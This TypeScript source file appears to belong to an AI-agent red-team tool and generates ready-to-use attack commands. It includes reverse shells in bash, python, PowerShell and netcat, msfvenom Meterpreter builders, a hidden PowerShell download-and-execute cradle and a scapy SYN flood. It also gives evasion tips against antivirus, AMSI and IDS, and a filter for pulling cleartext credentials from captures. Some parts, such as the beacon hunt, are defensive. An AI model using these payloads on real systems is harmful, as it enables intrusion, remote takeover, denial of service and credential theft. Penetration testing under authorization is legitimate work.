// ─────────────────────────────────────────────────────────────────────────────
// Red Team Arsenal — payload generators, packet crafters and sniffing recipes.
// PURE generation: nothing here executes, touches the network, or bypasses the
// guard chain. Outputs are (a) snippets the operator copies, or (b) commands
// the AGENT still has to run through the five-step wrapper (kill switch →
// scope → rate/policy → execute → audit) like any other shell command.
//
// Surfaces: the agent's generate_payload action, the Arsenal web view, and
// /api/arsenal. For authorized engagements only — same charter as the rest.
// ─────────────────────────────────────────────────────────────────────────────

export interface ArsenalItem {
  id: string
  title: string
  /** rendered command/snippet (placeholders substituted) */
  output: string
  /** what it is and when to use it */
  notes: string
  /** opsec/detection caveats */
  caveats?: string
  /** the matching listener/handler command, if the payload needs one */
  handler?: string
}

export interface ArsenalKind {
  id: string
  group: 'payload' | 'packet' | 'sniff' | 'handler'
  label: string
  description: string
  fields: { key: string; label: string; placeholder?: string }[]
}

export const ARSENAL_KINDS: ArsenalKind[] = [
  // ── payloads ──
  { id: 'revshell_bash', group: 'payload', label: 'Reverse shell — bash', description: 'Bash /dev/tcp one-liner; ubiquitous but noisy. Needs a listener.', fields: [{ key: 'lhost', label: 'LHOST (your IP)' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'revshell_python', group: 'payload', label: 'Reverse shell — python3', description: 'Short, present almost everywhere, spawns a pty immediately.', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'revshell_powershell', group: 'payload', label: 'Reverse shell — powershell', description: 'Windows target one-liner (TCP client).', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'revshell_nc', group: 'payload', label: 'Reverse shell — netcat', description: 'Classic nc -e; needs nc with -e support (not openbsd nc).', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'msf_meterpreter_windows', group: 'payload', label: 'msfvenom — windows meterpreter', description: 'windows/meterpreter/reverse_tcp EXE builder + matching handler.', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }, { key: 'outfile', label: 'output file', placeholder: 'shell.exe' }] },
  { id: 'msf_shell_linux', group: 'payload', label: 'msfvenom — linux shell', description: 'linux/x64/shell_reverse_tcp ELF builder + handler.', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }, { key: 'outfile', label: 'output file', placeholder: 'shell.elf' }] },
  { id: 'msf_powershell_stageless', group: 'payload', label: 'msfvenom — powershell stageless', description: 'powershell reverse_tcp raw stageless output.', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'revshell_upgrade', group: 'payload', label: 'TTY upgrade', description: 'Turn a dumb shell into a full interactive TTY (pty).', fields: [] },
  // ── packets ──
  { id: 'pkt_syn_scan', group: 'packet', label: 'SYN scan (scapy)', description: 'Half-open scan via scapy — quieter than a full connect.', fields: [{ key: 'target', label: 'target IP' }, { key: 'ports', label: 'ports', placeholder: '21,22,80,443' }] },
  { id: 'pkt_icmp_sweep', group: 'packet', label: 'ICMP sweep (scapy)', description: 'Ping a whole chartered subnet with scapy.', fields: [{ key: 'cidr', label: 'CIDR', placeholder: '10.10.10.0/24' }] },
  { id: 'pkt_arp_scan', group: 'packet', label: 'ARP scan (scapy)', description: 'L2 host discovery on the local segment — IP-layer firewalls never see it.', fields: [{ key: 'cidr', label: 'CIDR', placeholder: '192.168.1.0/24' }] },
  { id: 'pkt_syn_flood_lab', group: 'packet', label: 'SYN flood (LAB ONLY)', description: 'Resource-exhaustion test against YOUR OWN lab host. Never outside charter.', fields: [{ key: 'target', label: 'target IP' }, { key: 'port', label: 'port', placeholder: '80' }] },
  // ── sniffing (Wireshark engine: tshark) ──
  { id: 'sniff_live', group: 'sniff', label: 'Live capture (tshark)', description: 'Capture packets on an interface with a BPF/display filter.', fields: [{ key: 'iface', label: 'interface', placeholder: 'eth0' }, { key: 'bpf', label: 'filter', placeholder: 'tcp port 80' }, { key: 'count', label: 'packet count', placeholder: '50' }] },
  { id: 'sniff_pcaps', group: 'sniff', label: 'Analyze a pcap', description: 'Endpoint/conversation summary of a captured file.', fields: [{ key: 'file', label: 'pcap file', placeholder: 'capture.pcap' }] },
  { id: 'sniff_http', group: 'sniff', label: 'HTTP objects + creds', description: 'Extract HTTP objects and spot cleartext credentials.', fields: [{ key: 'file', label: 'pcap file', placeholder: 'capture.pcap' }] },
  { id: 'sniff_follow_tcp', group: 'sniff', label: 'Follow a TCP stream', description: 'Reassemble one conversation (ascii) — Wireshark follow-stream, scripted.', fields: [{ key: 'file', label: 'pcap file', placeholder: 'capture.pcap' }, { key: 'stream', label: 'stream #', placeholder: '0' }] },
  { id: 'sniff_beacon_hunt', group: 'sniff', label: 'Beacon hunt', description: 'Find periodic C2-like traffic: per-talker inter-arrival stats.', fields: [{ key: 'file', label: 'pcap file', placeholder: 'capture.pcap' }] },
  // ── handlers ──
  { id: 'handler_nc', group: 'handler', label: 'Listener — netcat', description: 'Bare TCP listener for reverse shells.', fields: [{ key: 'lport', label: 'LPORT', placeholder: '4444' }] },
  { id: 'handler_socat_tls', group: 'handler', label: 'Listener — socat (TLS)', description: 'Encrypted listener; pair with an openssl client payload.', fields: [{ key: 'lport', label: 'LPORT', placeholder: '4444' }, { key: 'cert', label: 'cert pem', placeholder: 'srv.pem' }] },
  { id: 'handler_msf', group: 'handler', label: 'Listener — metasploit', description: 'exploit/multi/handler for any msfvenom payload.', fields: [{ key: 'lhost', label: 'LHOST' }, { key: 'lport', label: 'LPORT', placeholder: '4444' }, { key: 'payload', label: 'payload', placeholder: 'windows/meterpreter/reverse_tcp' }] },
]

const v = (opts: Record<string, string>, k: string, d: string) => (opts[k] ?? '').trim() || d

type Builder = (o: Record<string, string>) => ArsenalItem

const BUILDERS: Record<string, Builder> = {
  revshell_bash: o => ({
    id: 'revshell_bash',
    title: 'bash reverse shell',
    output: `bash -i >& /dev/tcp/${v(o, 'lhost', 'LHOST')}/${v(o, 'lport', '4444')} 0>&1`,
    notes: 'Works on most Linux targets with no tools. Wrap in `nohup ... &` to survive the closing terminal.',
    caveats: 'Plaintext on the wire — wrap in TLS (socat/openssl) if IDS matters. /dev/tcp is disabled on some hardened builds.',
    handler: `nc -lvnp ${v(o, 'lport', '4444')}`,
  }),
  revshell_python: o => ({
    id: 'revshell_python',
    title: 'python3 reverse shell',
    output: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${v(o, 'lhost', 'LHOST')}",${v(o, 'lport', '4444')}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
    notes: 'Includes a pty spawn so the shell is usable immediately. Short enough to paste into most injection points.',
    caveats: 'Obvious in process lists (python with a socket); EDR often flags it on Windows.',
    handler: `nc -lvnp ${v(o, 'lport', '4444')}`,
  }),
  revshell_powershell: o => {
    const LHOST = v(o, 'lhost', 'LHOST')
    const LPORT = v(o, 'lport', '4444')
    return {
      id: 'revshell_powershell',
      title: 'powershell reverse shell',
      output: `$c=New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`,
      notes: 'Survive quoting with: powershell -enc <base64 of the command> (UTF-16LE base64). Stageless TCP client one-liner.',
      caveats: 'Plain form is caught by AMSI/Defender signatures — test detection in YOUR lab before relying on it.',
      handler: `nc -lvnp ${LPORT}`,
    }
  },
  revshell_nc: o => {
    const H = v(o, 'lhost', 'LHOST')
    const P = v(o, 'lport', '4444')
    return {
      id: 'revshell_nc',
      title: 'netcat reverse shell',
      output: `rm -f /tmp/.f; mkfifo /tmp/.f; cat /tmp/.f | /bin/sh -i 2>&1 | nc ${H} ${P} > /tmp/.f; rm -f /tmp/.f\n\n# if the build of nc has -e (traditional/ncat), this simpler form also works:\n# nc ${H} ${P} -e /bin/bash\n# check: nc -h 2>&1 | grep -- '-e '`,
      notes: 'The fifo form is portable — it works on traditional nc, ncat and openbsd nc (Kali/Ubuntu 24+ default) alike, no -e needed. Clean up /tmp/.f when done. ncat adds: ncat --ssl HOST PORT -e /bin/bash for encryption.',
      caveats: 'busybox nc variants want `nc -l -p PORT` on the LISTENER side instead of -lvnp. Some shells (dash) lack history/bang safety — /bin/sh is fine here.',
      handler: `nc -lvnp ${P}`,
    }
  },
  msf_meterpreter_windows: o => {
    const LHOST = v(o, 'lhost', 'LHOST')
    const LPORT = v(o, 'lport', '4444')
    const OUT = v(o, 'outfile', 'shell.exe')
    return {
      id: 'msf_meterpreter_windows',
      title: 'msfvenom windows meterpreter',
      output: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o ${OUT}`,
      notes: 'Stageless alternative (fewer callbacks): windows/meterpreter_reverse_tcp. Arch must match target (x64 vs x86).',
      caveats: 'Default EXEs are signature-detected by every AV — custom templates (-x) or shellcode runners for real engagements.',
      handler: `msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run"`,
    }
  },
  msf_shell_linux: o => {
    const LHOST = v(o, 'lhost', 'LHOST')
    const LPORT = v(o, 'lport', '4444')
    const OUT = v(o, 'outfile', 'shell.elf')
    return {
      id: 'msf_shell_linux',
      title: 'msfvenom linux shell',
      output: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o ${OUT}`,
      notes: 'chmod +x before execution. Confirm target arch first (x64 vs arm) — wrong arch segfaults silently.',
      caveats: 'Plain TCP plaintext; upgrade the dumb shell right away (see TTY upgrade).',
      handler: `nc -lvnp ${LPORT}`,
    }
  },
  msf_powershell_stageless: o => {
    const LHOST = v(o, 'lhost', 'LHOST')
    const LPORT = v(o, 'lport', '4444')
    return {
      id: 'msf_powershell_stageless',
      title: 'msfvenom powershell stageless',
      output: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o psh.bin`,
      notes: `Deliver hosted: powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:8000/psh.bin')" (serve with python3 -m http.server 8000).`,
      caveats: 'x64 payload needs a 64-bit process; plain HTTP delivery is caught by AMSI in default form — lab first.',
      handler: `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run"`,
    }
  },
  revshell_upgrade: () => ({
    id: 'revshell_upgrade',
    title: 'TTY upgrade',
    output: `python3 -c 'import pty;pty.spawn("/bin/bash")'   # in the dumb shell\n# Ctrl-Z (background it), then on YOUR box:\nstty raw -echo; fg\n# back in the shell:\nexport TERM=xterm; stty rows 40 cols 120`,
    notes: 'Gives tab-completion, Ctrl-C that does not kill the shell, and clean su/sudo. Use rlwrap nc -lvnp PORT upfront for readline keys.',
  }),
  pkt_syn_scan: o => {
    const T = v(o, 'target', 'TARGET')
    return {
      id: 'pkt_syn_scan',
      title: 'scapy SYN scan',
      output: `sudo python3 -c '
from scapy.all import sr1, IP, TCP, conf
conf.verb = 0
for p in "${v(o, 'ports', '21,22,80,443')}".split(","):
    r = sr1(IP(dst="${T}")/TCP(dport=int(p), flags="S"), timeout=1)
    if r is not None and r.haslayer(TCP) and int(r[TCP].flags) == 0x12:
        print(f"OPEN {p}")
        sr1(IP(dst="${T}")/TCP(dport=int(p), flags="R"), timeout=1)
'`,
      notes: 'Half-open: RST after SYN/ACK so no service log entry exists. Needs root — suffixed the sudo. Safe to paste over ssh (single-quoted, no expansion).',
      caveats: 'Raw sockets through the WSL NAT can behave oddly against remote hosts — cross-check surprising results with nmap.',
    }
  },
  pkt_icmp_sweep: o => ({
    id: 'pkt_icmp_sweep',
    title: 'scapy ICMP sweep',
    output: `sudo python3 -c '
from scapy.all import sr, IP, ICMP, conf
conf.verb = 0
ans, _ = sr(IP(dst="${v(o, 'cidr', '10.10.10.0/24')}")/ICMP(), timeout=2)
for s, r in ans: print(r.src, "UP")
'`,
    notes: 'Whole chartered range in one shot; prints only responders. Needs root (sudo included). Add /ICMP()/b"x" padding here if targets drop empty echoes. Piping to `sort -t. -k4 -n` gives sorted results.',
  }),
  pkt_arp_scan: o => ({
    id: 'pkt_arp_scan',
    title: 'scapy ARP scan',
    output: `sudo python3 -c '
from scapy.all import srp, Ether, ARP, conf
conf.verb = 0
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="${v(o, 'cidr', '192.168.1.0/24')}"), timeout=2)
for s, r in ans: print(r.psrc, r.hwsrc)
'`,
    notes: 'L2 discovery — invisible to IP-layer firewalls. sudo included. picks the default interface unless you set conf.iface = "<iface>" inside the script. Works only on the segment your interface is attached to.',
  }),
  pkt_syn_flood_lab: o => ({
    id: 'pkt_syn_flood_lab',
    title: 'SYN flood (LAB ONLY)',
    output: `sudo python3 -c '
from scapy.all import send, IP, TCP, RandShort
send(IP(dst="${v(o, 'target', 'TARGET')}")/TCP(sport=RandShort(), dport=${v(o, 'port', '80')}, flags="S"), loop=1, inter=0.001)
'`,
    notes: 'Resource-exhaustion test for YOUR OWN lab server (capacity planning, IDS tuning). Ctrl-C stops it.',
    caveats: 'Denial-of-Service: NEVER outside your own lab charter. Authorization is on you — this is the line.',
  }),
  sniff_live: o => ({
    id: 'sniff_live',
    title: 'tshark live capture',
    output: `sudo tshark -i ${v(o, 'iface', 'eth0')} -f '${v(o, 'bpf', 'tcp port 80')}' -c ${v(o, 'count', '50')} -a dur:180 2>/dev/null | head -60`,
    notes: 'Wireshark engine, scripted. The filter goes in -f (BPF capture filter: tcp port 80, host X, net X/Y) — -Y wants DISPLAY-filter syntax (tcp.port==80) and will reject BPF. Duration cap -a dur:180 stops auto-cleanup promiscuous exposure. List interfaces: tshark -D. JSON: -T json.',
    caveats: 'Promiscuous capture needs root. Inside WSL you see the NAT bridge only — for real LAN captures run on the target-side host.',
  }),
  sniff_pcaps: o => ({
    id: 'sniff_pcaps',
    title: 'pcap conversation summary',
    output: `tshark -r ${v(o, 'file', 'capture.pcap')} -q -z conv,tcp -z conv,udp 2>/dev/null | head -40`,
    notes: 'Conversation table = who talked to whom, bytes each way. Add -z endpoints,ip for per-host totals; anomalous peers jump out here.',
  }),
  sniff_http: o => ({
    id: 'sniff_http',
    title: 'HTTP objects & cleartext creds',
    output: `mkdir -p http_objs && sudo tshark -r ${v(o, 'file', 'capture.pcap')} --export-objects http,http_objs 2>/dev/null; ls -la http_objs | head -15; tshark -r ${v(o, 'file', 'capture.pcap')} -Y 'http.authorization or http.request.method == "POST"' -T fields -e http.authorization 2>/dev/null | grep -v '^\s*$' | head -20`,
    notes: 'Exports reassembled files (droppers, exfil) and surfaces Authorization headers / POST bodies. Basic auth is base64 = cleartext. Display-filter syntax needs no sudo for a plain file read; tshark ≥ 3 warns on unquoted method strings.',
  }),
  sniff_follow_tcp: o => ({
    id: 'sniff_follow_tcp',
    title: 'follow TCP stream',
    output: `tshark -r ${v(o, 'file', 'capture.pcap')} -q -z follow,tcp,ascii,${v(o, 'stream', '0')} 2>/dev/null | head -80`,
    notes: 'Scripted Wireshark Follow-Stream. List stream indexes first with -z conv,tcp, then follow the interesting one.',
  }),
  sniff_beacon_hunt: o => ({
    id: 'sniff_beacon_hunt',
    title: 'beacon / C2 periodicity hunt',
    output: `tshark -r ${v(o, 'file', 'capture.pcap')} -T fields -e frame.time_epoch -e ip.src -e ip.dst 2>/dev/null | awk '{d[$2"->"$3]=d[$2"->"$3]" "$1} END {for (k in d) {n=split(d[k],t," "); if(n>5){first=t[2];last=t[n];iv=(last-first)/(n-1); if (iv>0.9 && iv<120) printf "%s n=%d avg=%.1fs PERIODIC\\n",k,n,iv}}}'`,
    notes: 'Flags talkers with near-constant inter-arrival times (~1s–120s) over >5 packets — the classic implant beacon signature. Follow each hit as a TCP stream.',
  }),
  handler_nc: o => ({
    id: 'handler_nc',
    title: 'netcat listener',
    output: `nc -lvnp ${v(o, 'lport', '4444')}`,
    notes: 'Start the listener BEFORE firing the payload. -v prints the incoming connection source.',
  }),
  handler_socat_tls: o => ({
    id: 'handler_socat_tls',
    title: 'socat TLS listener',
    output: `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out ${v(o, 'cert', 'srv.pem')} -days 30 -nodes -subj '/CN=srv'\nsocat OPENSSL-LISTEN:${v(o, 'lport', '4444')},cert=${v(o, 'cert', 'srv.pem')},verify=0,fork EXEC:'/bin/bash',pty,setsid,sigint,sane`,
    notes: "Encrypted channel — IDS sees TLS, not commands. Client side on target: socat OPENSSL:LHOST:PORT,verify=0 EXEC:'/bin/bash',pty,setsid,sigint,sane",
  }),
  handler_msf: o => ({
    id: 'handler_msf',
    title: 'metasploit handler',
    output: `msfconsole -q -x "use exploit/multi/handler; set payload ${v(o, 'payload', 'windows/meterpreter/reverse_tcp')}; set LHOST ${v(o, 'lhost', 'LHOST')}; set LPORT ${v(o, 'lport', '4444')}; set ExitOnSession false; run -j"`,
    notes: '-j jobs the listener so one msfconsole holds many sessions. Meterpreter adds migration, screenshot, hashdump post modules.',
  }),
}

export function arsenalCatalog(): ArsenalKind[] {
  return ARSENAL_KINDS
}

export function generateArsenal(kindId: string, opts: Record<string, string> = {}): ArsenalItem | { error: string } {
  const builder = BUILDERS[kindId]
  if (!builder) return { error: `unknown arsenal kind "${kindId}" — see arsenalCatalog()` }
  return builder(opts)
}
